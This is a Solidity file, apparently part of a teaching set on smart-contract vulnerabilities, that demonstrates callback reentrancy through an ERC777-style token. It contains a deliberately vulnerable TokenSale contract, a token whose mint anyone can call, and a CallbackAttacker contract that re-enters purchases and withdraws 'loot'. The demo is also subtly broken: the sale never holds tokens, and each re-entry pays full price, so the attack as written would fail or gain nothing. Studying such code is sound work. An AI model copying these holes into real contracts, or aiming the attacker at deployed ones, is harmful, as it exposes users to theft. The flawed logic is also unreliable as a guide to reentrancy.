// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Attack 4: Callback Standard Reentrancy
// ERC777 and ERC721 safeMint create attack surfaces through callbacks

interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

contract SimpleERC777 {
    mapping(address => uint256) public balances;
    
    function mint(address to, uint256 amount) external {
        balances[to] += amount;
        
        // ERC777 callback - gives control to recipient
        if (isContract(to)) {
            IERC777Recipient(to).tokensReceived(
                msg.sender,
                address(0),
                to,
                amount,
                "",
                ""
            );
        }
    }
    
    function transfer(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient");
        
        balances[msg.sender] -= amount;
        balances[to] += amount;
        
        // Callback before state finalization
        if (isContract(to)) {
            IERC777Recipient(to).tokensReceived(
                msg.sender,
                msg.sender,
                to,
                amount,
                "",
                ""
            );
        }
    }
    
    function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }
}

contract TokenSale {
    SimpleERC777 public token;
    uint256 public price = 0.01 ether;
    uint256 public sold;
    
    constructor(address _token) {
        token = SimpleERC777(_token);
    }
    
    // VULNERABLE: Calls token.transfer which triggers callback
    function buyTokens(uint256 amount) external payable {
        require(msg.value == amount * price, "Wrong payment");
        
        sold += amount;
        
        // This triggers tokensReceived callback!
        // Attacker can re-enter before sold is finalized
        token.transfer(msg.sender, amount);
    }
    
    receive() external payable {}
}

contract CallbackAttacker is IERC777Recipient {
    TokenSale public sale;
    SimpleERC777 public token;
    uint256 public attackCount;
    
    constructor(address payable _sale, address _token) {
        sale = TokenSale(_sale);
        token = SimpleERC777(_token);
    }
    
    // ERC777 callback - called during token transfer
    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {
        // Re-enter during callback
        if (attackCount < 3 && address(sale).balance >= 0.01 ether) {
            attackCount++;
            sale.buyTokens{value: 0.01 ether}(1);
        }
    }
    
    function attack() external payable {
        sale.buyTokens{value: 0.01 ether}(1);
    }
    
    function withdrawLoot() external {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    receive() external payable {}
}
